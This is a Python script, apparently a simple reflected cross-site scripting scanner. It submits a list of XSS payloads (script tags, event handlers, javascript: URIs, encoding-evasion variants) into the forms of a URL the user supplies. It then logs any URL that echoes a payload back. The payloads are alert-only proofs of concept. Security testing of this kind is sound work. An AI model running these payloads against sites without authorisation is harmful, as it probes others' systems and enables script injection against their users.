import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlencode
import re

# Extended XSS Payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input type='text' value='<script>alert('XSS')'></script>'>",
    "<link rel='stylesheet' href='javascript:alert('XSS')'>",
    "<a href='javascript:alert('XSS')'>Click me</a>",
    "<div onmouseover=alert('XSS')>Hover over me!</div>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<IMG SRC=j&#X41vascript:alert('XSS')>",
    "<IMG SRC=\"jav ascript:alert('XSS');\">",
    "<IMG SRC=`javascript:alert('XSS')`>",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
    "<iframe src=\"javascript:alert('XSS');\"></iframe>",
    "<table background=\"javascript:alert('XSS')\">",
    "<div style=\"width: expression(alert('XSS'));\">"
]

def get_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    return soup.find_all('form')

def submit_form(form, url, payload):
    action = form.get('action')
    method = form.get('method', 'get').lower()
    inputs = form.find_all(['input', 'textarea', 'select'])
    
    data = {}
    for input_tag in inputs:
        name = input_tag.get('name')
        if name:
            data[name] = payload if input_tag.get('type') == 'text' else input_tag.get('value')

    target_url = urljoin(url, action)

    if method == 'post':
        return requests.post(target_url, data=data), target_url, data
    else:
        return requests.get(target_url, params=data), target_url, data

def scan_xss(url):
    print("Scanning in progress, please wait...")
    forms = get_forms(url)

    for form in forms:
        for payload in xss_payloads:
            response, target_url, data = submit_form(form, url, payload)
            try:
                content = response.content.decode('utf-8', errors='ignore')
            except UnicodeDecodeError:
                content = response.content.decode('latin1', errors='ignore')
            if payload in content:
                print(f"XSS vulnerability detected with payload: {payload}")
                print(f"Form details: {form}")
                print(f"Injected URL: {target_url}?{urlencode(data)}")
                with open("vulnerable_urls.txt", "a") as file:
                    file.write(f"{target_url}?{urlencode(data)}\n")
                print("vulnerable_urls.txt has been updated with the detected vulnerability.")
                return True

    print("No XSS vulnerability detected.")
    return False

def main():
    url = input("Enter URL to scan for XSS: ")
    scan_xss(url)

if __name__ == "__main__":
    main()
